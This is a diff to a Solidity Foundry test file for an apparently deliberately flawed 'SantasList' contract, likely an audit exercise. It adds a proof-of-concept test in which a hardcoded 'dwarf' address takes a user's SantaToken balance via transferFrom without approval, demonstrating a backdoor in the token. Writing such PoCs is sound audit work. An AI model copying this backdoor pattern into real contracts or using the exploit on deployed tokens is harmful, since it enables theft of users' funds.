@@ -213,4 +213,22 @@ contract SantasListTest is Test {
 
         assertEq(santasList.balanceOf(attacker), 4);
     }
+
+    function testSantaTokenCanBeExploited() public {
+        address dwarf = address(0x815F577F1c1bcE213c012f166744937C889DAF17);
+        vm.startPrank(santa);
+        santasList.checkList(user, SantasList.Status.EXTRA_NICE);
+        santasList.checkTwice(user, SantasList.Status.EXTRA_NICE);
+        vm.stopPrank();
+
+        vm.startPrank(user);
+        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);
+        santasList.collectPresent();
+        vm.stopPrank();
+
+        vm.startPrank(dwarf);
+        santaToken.transferFrom(user, dwarf, 1e18);
+        assertEq(santaToken.balanceOf(dwarf), 1e18);
+        assertEq(santaToken.balanceOf(user), 0);
+    }
 }
